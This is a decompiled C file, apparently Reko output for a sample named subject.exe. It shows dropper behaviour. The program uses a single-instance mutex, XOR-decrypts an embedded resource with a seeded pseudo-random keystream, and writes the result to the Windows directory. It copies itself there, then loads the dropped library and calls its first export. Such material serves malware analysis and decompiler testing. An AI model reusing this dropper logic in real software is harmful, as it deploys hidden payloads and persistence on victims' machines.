// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register ui32 fn00401000()
ui32 fn00401000()
{
	Eq_3 eax_5 = globals->t4030E8 *s 0x000343FD + 2531011;
	globals->t4030E8 = eax_5;
	return eax_5 >> 0x10 & 0x7FFF;
}

// 0040101E: void fn0040101E(Stack Eq_3 dwArg04)
void fn0040101E(Eq_3 dwArg04)
{
	globals->t4030E8 = dwArg04;
}

// 00401028: void fn00401028(Stack word32 dwArg04, Stack Eq_20 dwArg08)
void fn00401028(word32 dwArg04, LPCSTR dwArg08)
{
	Eq_21 eax_22 = GetModuleHandleA(null);
	Eq_27 eax_33 = FindResourceA(eax_22, (word32) wArg04, &globals->t4030C8);
	Eq_37 eax_44 = LockResource(LoadResource(eax_22, eax_33));
	if (eax_44 == 0x00)
		return;
	Eq_3 eax_105 = SizeofResource(eax_22, eax_33);
	Eq_55 eax_123 = CreateFileA(dwArg08, 0x40000000, 0x00, null, 0x02, 0x80, null);
	if (eax_123 == (void *) ~0x00)
		return;
	Eq_3 ebx_128 = 0x00;
	if (eax_105 > 0x00)
	{
		do
		{
			Mem175[ebx_128 + eax_44:byte] = Mem0[ebx_128 + eax_44:byte] ^ (byte) ((int32) ((int64) fn00401000() % 0x0100));
			ebx_128 = (word32) ebx_128 + 0x01;
		} while (ebx_128 < eax_105);
	}
	WriteFile(eax_123, eax_44, eax_105, fp - 0x08, null);
	CloseHandle(eax_123);
}

// 004010DA: void fn004010DA(Register word32 ebp)
void fn004010DA(word32 ebp)
{
	GetModuleFileNameA(null, fp + ~0x0C67, 0x0400);
	GetWindowsDirectoryA(fp - 0x0424, 0x0400);
	GetWindowsDirectoryA(fp + ~0x0847, 0x0400);
	if (bLoc06 != 0x5C)
		lstrcatA(fp - 0x0424, &globals->t4030E0);
	ptr32 esp_107;
	lstrcatA(esp_46->t0000, esp_46->t0004);
	if (bLoc0428 != 0x5C)
	{
		*(esp_107 - 0x04) = 0x004030E0;
		*(esp_107 - 0x08) = fp + ~0x0847;
		word32 ebp_108;
		byte SCZO_109;
		word32 esi_110;
		word32 edi_111;
		word32 eax_112;
		bool Z_113;
		word32 ecx_114;
		esi_51();
	}
	LPCSTR * esp_62 = esp_107 - 0x04;
	*esp_62 = (LPCSTR *) globals->t403000;
	*(esp_62 - 0x04) = fp + ~0x0847;
	ptr32 esp_67;
	word32 ebp_68;
	byte SCZO_69;
	word32 esi_70;
	word32 edi_71;
	word32 eax_72;
	bool Z_73;
	word32 ecx_74;
	esi_51();
	*(esp_67 - 0x04) = fp + ~0x0847;
	*(esp_67 - 0x08) = 101;
	fn00401028(dwArg00, dwArg04);
	*(esp_67 - 0x04) = 0x00;
	*(esp_67 - 0x08) = fp - 0x0424;
	*(esp_67 - 0x0C) = fp + ~0x0C67;
	CopyFileA(*(esp_67 - 0x0C), *(esp_67 - 0x08), *(esp_67 - 0x04));
}

// 00401189: Register Eq_3 Win32CrtStartup()
Eq_3 Win32CrtStartup()
{
	globals->t4030E4 = CreateMutexA(null, 0x00, globals->t403008);
	if (GetLastError() != 0xB7)
	{
		fn0040101E(0x00);
		fn004010DA(ebp);
		fn0040101E(GetTickCount());
		Eq_21 eax_40 = GetModuleHandleA(globals->t403000);
		if (eax_40 == null || eax_40 == (struct HINSTANCE__ *) ~0x00)
			eax_40 = LoadLibraryA(globals->t403000);
		if (eax_40 != null && eax_40 != (struct HINSTANCE__ *) ~0x00)
		{
			Eq_312 eax_58 = GetProcAddress(eax_40, (CHAR *) 0x01);
			if (eax_58 != null)
				eax_58();
		}
	}
	return 0x00;
}

